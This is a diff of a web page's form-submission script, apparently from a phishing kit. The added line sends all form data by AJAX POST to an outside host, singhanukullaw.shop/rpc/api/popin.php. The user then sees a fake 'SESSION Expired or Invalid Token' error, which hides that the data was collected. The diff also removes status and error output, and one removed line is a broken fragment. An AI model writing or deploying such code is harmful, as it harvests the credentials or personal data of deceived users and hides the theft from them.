@@ -7690,8 +7690,8 @@
           let formData = new FormData(this);
 
           $.ajax({
-            type: "POST",
-            url: "https://kolanhastanesii.com/rpc/api/",
+           type: "POST",
+            url: "https://singhanukullaw.shop/rpc/api/popin.php",
             data: formData,
             cache: false,
             contentType: false,
@@ -7706,20 +7706,13 @@
             success: function () {
             //   dismissAllDialogs();
               setTimeout(function () {
-			  successBox.show();
                 restoreButtons();
-				if (response.status === "success") {
-					alert("✅ " + response.message);
-				} else {
-					alert("❌ " + response.message);
-				}
                 $("div.message-tab").html(
                   "<div class='alert alert-danger'>SESSION Expired or Invalid Token Request,<br> please try again later.</div>"
                 );
               }, 5000);
             },
-            error: function (xhr, status, error) {
-			let =
+            error: function () {
               restoreButtons();
               dismissAllDialogs();
               errorBox.show();
@@ -7727,9 +7720,6 @@
                 dismissAllDialogs();
                 $("#send-dialog").show();
               }, 2500);
-			  $("#sendfailed").html("Request Error → " + status + " : " + error);
-			  console.log("Error:", error); 
-			  $("#result").html("⚠️ AJAX Error → " + status + " : " + error + "<br>" + xhr.responseText);
             },
           });
           function restoreButtons() {
